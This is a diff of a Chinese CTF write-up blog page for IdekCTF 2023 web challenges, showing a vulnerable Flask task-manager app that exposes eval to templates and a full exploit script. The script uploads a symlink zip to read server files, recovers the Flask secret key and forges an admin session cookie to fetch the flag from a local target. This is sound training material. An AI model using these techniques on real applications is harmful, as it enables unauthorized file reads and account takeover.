@@ -1,13 +1,179 @@
-<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="referrer" content="no-referrer"><meta name="google-site-verification" content="YKwcqblwsZCg-ylX8b6YPzjmkIRadB3nD8IU3XMN6gg"><title>IdekCTF2023 | Web(部分) | Boogiepop Doesn't Laugh</title><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
-if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
- font-family: BenderLight;
- src: local('Bender'), url("/font/BenderLight.ttf");
-}
-@font-face {
- font-family: 'JetBrains Mono';
- src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
-}</style><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Boogiepop Doesn't Laugh" type="application/atom+xml">
-</head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>IdekCTF2023 | Web(部分)</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-03-10T04:56:51.954Z" id="date"> 2023-03-10</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-03-10T05:07:20.763Z" id="updated"> 2023-03-10</time></div></span></div></div><hr><div id="post-content"><p>参考：<br><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2023/01/16/year/2023/2023IdekCTFWriteup/#2023-IdekCTF-Writeup">https://y4tacker.github.io/2023/01/16/year/2023/2023IdekCTFWriteup/#2023-IdekCTF-Writeup</a></p>
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>IdekCTF2023 | Web(部分) - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="IdekCTF2023 | Web(部分) - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2023/03/10/IdekCTF2023%20_%20Web(%E9%83%A8%E5%88%86)/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-03-10T04:56:51.954Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/WriteUp/">WriteUp</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>March</span>
+            <span>10,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">IdekCTF2023 | Web(部分)</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <p>参考：<br><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2023/01/16/year/2023/2023IdekCTFWriteup/#2023-IdekCTF-Writeup">https://y4tacker.github.io/2023/01/16/year/2023/2023IdekCTFWriteup/#2023-IdekCTF-Writeup</a></p>
 <h1 id="Task-Manager"><a href="#Task-Manager" class="headerlink" title="Task-Manager"></a>Task-Manager</h1><p>考点：pydash原型链污染<br>一个事务管理器：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678364874969-eefea74f-1a44-4a30-bd8d-75763af775be.png#averageHue=%23fefdfd&clientId=ud3b2cc69-f72a-4&from=paste&height=399&id=u8726af06&name=image.png&originHeight=499&originWidth=1251&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26516&status=done&style=none&taskId=u11cdfec3-6283-4c03-b4bf-fc88810a6c8&title=&width=1000.8" alt="image.png"><br>我觉得这是最好玩的一题了，没想到吧，python也有原型链污染，因此也让我思考起了别的语言会不会也有原型链污染呢？比如Java之类的（java还是不太可能）</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect</span><br><span class="line"><span class="keyword">from</span> taskmanager <span class="keyword">import</span> TaskManager</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_first_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    <span class="keyword">if</span> app.env == <span class="string">&#x27;yolo&#x27;</span>:</span><br><span class="line">        app.add_template_global(<span class="built_in">eval</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:path&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_page</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;templates/&quot;</span> + path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;not found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> render_template(path)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/api/manage_tasks&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manage_tasks</span>():</span><br><span class="line">    task, status = request.json.get(<span class="string">&#x27;task&#x27;</span>), request.json.get(<span class="string">&#x27;status&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> task <span class="keyword">or</span> <span class="built_in">type</span>(task) != <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;You must provide a task name as a string!&quot;</span>&#125;, <span class="number">400</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(task) &gt; <span class="number">150</span>:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Tasks may not be over 150 characters long!&quot;</span>&#125;, <span class="number">400</span></span><br><span class="line">    <span class="keyword">if</span> status <span class="keyword">and</span> <span class="built_in">len</span>(status) &gt; <span class="number">50</span>:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Statuses may not be over 50 characters long!&quot;</span>&#125;, <span class="number">400</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> status:</span><br><span class="line">        tasks.complete(task)</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Task marked complete!&quot;</span>&#125;, <span class="number">200</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(status) != <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Your status must be a string!&quot;</span>&#125;, <span class="number">400</span></span><br><span class="line">    <span class="keyword">if</span> tasks.<span class="built_in">set</span>(task, status):</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Task updated!&quot;</span>&#125;, <span class="number">200</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid task name!&quot;</span>&#125;, <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/api/get_tasks&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_tasks</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        task = request.json.get(<span class="string">&#x27;task&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> tasks.get(task)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> tasks.get_all()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/home.html&quot;</span>)</span><br><span class="line"></span><br><span class="line">tasks = TaskManager()</span><br><span class="line"></span><br><span class="line">app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">6666</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>还有一个taskmanager.py</p>
@@ -62,22 +228,149 @@ if (window.localStorage.getItem('theme-mode') === 'dark') document.documentEleme
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests, re, time, datetime, random</span><br><span class="line"><span class="keyword">import</span> flask_unsign</span><br><span class="line"></span><br><span class="line">sess = requests.session()</span><br><span class="line">SECRET_OFFSET = -<span class="number">67198624</span> * <span class="number">1000</span></span><br><span class="line">userinfo = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;yyds&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;yyds&quot;</span>&#125;</span><br><span class="line">baseurl = <span class="string">&quot;http://127.0.0.1:1337/&quot;</span></span><br><span class="line">pocZip = <span class="string">&quot;UEsDBAoAAAAAACJsMVZvT1MBDwAAAA8AAAAKABwAc2VydmVyLmxvZ1VUCQADDzPGYw8zxmN1eAsAAQT1AQAABBQAAAAvdG1wL3NlcnZlci5sb2dQSwMECgAAAAAAG2wxVuPo95IOAAAADgAAAAkAHABjb25maWcucHlVVAkAAwUzxmMFM8ZjdXgLAAEE9QEAAAQUAAAAL2FwcC9jb25maWcucHlQSwECHgMKAAAAAAAibDFWb09TAQ8AAAAPAAAACgAYAAAAAAAAAAAA7aEAAAAAc2VydmVyLmxvZ1VUBQADDzPGY3V4CwABBPUBAAAEFAAAAFBLAQIeAwoAAAAAABtsMVbj6PeSDgAAAA4AAAAJABgAAAAAAAAAAADtoVMAAABjb25maWcucHlVVAUAAwUzxmN1eAsAAQT1AQAABBQAAABQSwUGAAAAAAIAAgCfAAAApAAAAAAA&quot;</span></span><br><span class="line">cookie = <span class="string">&quot;&quot;</span></span><br><span class="line">log_url = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    reg_url = baseurl + <span class="string">&quot;register&quot;</span></span><br><span class="line">    sess.post(reg_url, userinfo)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">global</span> cookie</span><br><span class="line">    set_cookie = sess.post(baseurl + <span class="string">&quot;login&quot;</span>, data=userinfo, allow_redirects=<span class="literal">False</span>).headers[<span class="string">&#x27;Set-Cookie&#x27;</span>]</span><br><span class="line">    cookie = set_cookie[<span class="number">8</span>:<span class="number">82</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">global</span> log_url</span><br><span class="line">    log_url = re.search(<span class="string">&#x27;&lt;a href=&quot;/uploads/.*&quot;&gt;&#x27;</span>, sess.post(</span><br><span class="line">        baseurl + <span class="string">&quot;upload&quot;</span>, headers=&#123;<span class="string">&#x27;Cookie&#x27;</span>: <span class="string">f&#x27;session=<span class="subst">&#123;cookie&#125;</span>&#x27;</span>&#125;,</span><br><span class="line">        files=&#123;<span class="string">&#x27;file&#x27;</span>: base64.b64decode(pocZip)&#125;).text).group()[<span class="number">9</span>:-<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    server_log = baseurl + log_url + <span class="string">&quot;/server.log&quot;</span></span><br><span class="line">    config = baseurl + log_url + <span class="string">&quot;/config.py&quot;</span></span><br><span class="line">    SECRET_OFFSET = <span class="built_in">int</span>(re.findall(<span class="string">&quot;SECRET_OFFSET = (.*?) # REDACTED&quot;</span>, sess.get(config).text)[<span class="number">0</span>]) * <span class="number">1000</span></span><br><span class="line">    log = sess.get(server_log).text</span><br><span class="line">    now = (time.mktime(datetime.datetime.strptime(log.split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>][<span class="number">1</span>:<span class="number">20</span>], <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>).timetuple())) * <span class="number">1000</span></span><br><span class="line">    <span class="keyword">return</span> SECRET_OFFSET,now</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    register()</span><br><span class="line">    login()</span><br><span class="line">    upload()</span><br><span class="line">    SECRET_OFFSET, now = read()</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        decoded = &#123;<span class="string">&#x27;admin&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;uid&#x27;</span>: userinfo[<span class="string">&#x27;username&#x27;</span>]&#125;</span><br><span class="line">        random.seed(<span class="built_in">round</span>(now + <span class="built_in">int</span>(SECRET_OFFSET)))</span><br><span class="line">        SECRET_KEY = <span class="string">&quot;&quot;</span>.join([<span class="built_in">hex</span>(random.randint(<span class="number">0</span>, <span class="number">15</span>)) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]).replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        flag_url = baseurl + <span class="string">&quot;flag&quot;</span></span><br><span class="line">        res = sess.get(flag_url, headers=&#123;<span class="string">&#x27;Cookie&#x27;</span>: <span class="string">f&#x27;session=<span class="subst">&#123;flask_unsign.sign(decoded, SECRET_KEY)&#125;</span>&#x27;</span>&#125;).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;idek&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(now)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <h1 id="Paywall"><a href="#Paywall" class="headerlink" title="Paywall"></a>Paywall</h1><p>考点：Filterchain<br>使用探姬改的脚本就好了（挺好用的）<br> <img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678424133488-348df20b-e334-4e60-a12f-3bdb438407b0.png#averageHue=%23c6c6c6&clientId=uc45afee9-2314-4&from=paste&height=1054&id=uf1423b54&name=image.png&originHeight=1317&originWidth=2516&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=141803&status=done&style=none&taskId=u37aa8a68-7584-4b72-9dd7-5f5629491f9&title=&width=2012.8" alt="image.png"></p>
-<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/03/10/%E5%B4%AD%E6%96%B0%E5%87%BA%E5%8E%82%E7%9A%84Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">← Next 崭新出厂的Python原型链污染</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/03/08/KalmarCTF2023%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89/">KalmarCTF2023（部分） Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="valine-sel"></button></div><div id="valine"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Boogipop</a></h1><div id="description"><p>Are you still in pain?</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Task-Manager"><span class="toc-number">1.</span> <span class="toc-text">Task-Manager</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="toc-number">1.1.</span> <span class="toc-text">预期解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80"><span class="toc-number">1.1.1.</span> <span class="toc-text">解法一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C"><span class="toc-number">1.1.2.</span> <span class="toc-text">解法二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="toc-number">1.2.</span> <span class="toc-text">非预期解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">解法一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">解法二</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ReadME"><span class="toc-number">2.</span> <span class="toc-text">ReadME</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Proxy-viewer"><span class="toc-number">3.</span> <span class="toc-text">Proxy viewer</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SimpleFileServer"><span class="toc-number">4.</span> <span class="toc-text">SimpleFileServer</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Paywall"><span class="toc-number">5.</span> <span class="toc-text">Paywall</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{new Valine({
- el: '#valine'
- , appId: '4KNp8mNp9RkLrDSktdFbmIO8-gzGzoHsz'
- , appKey: 'I3KhKOyWDf9eRRnVEAit98wt' , placeholder: 'This comment is sent by Penguin Logistics.'
- , path: window.location.pathname
-});code.findCode();}</script><script src="/js/arknights.js"></script><script src="/js/pjax.js"></script><script>window.addEventListener("load",() => {pjax = new Pjax({
- cacheBust: false,
- selectors: ['title','article','#aside-block','.pjax-js'],
- switches: {'article': Pjax.switches.sideBySide},
- switchesOptions: {
-   'article': {
-     classNames: {
-       remove: "pjax-out",
-       add: "pjax-in"
-     }
-   }
- }
-});
-document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/WriteUp/" class="tag">#WriteUp</a><a href="/tags/IdekCTF/" class="tag">#IdekCTF</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/03/10/%E5%B4%AD%E6%96%B0%E5%87%BA%E5%8E%82%E7%9A%84Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">崭新出厂的Python原型链污染</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/03/08/KalmarCTF2023%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">KalmarCTF2023（部分）</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2023 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
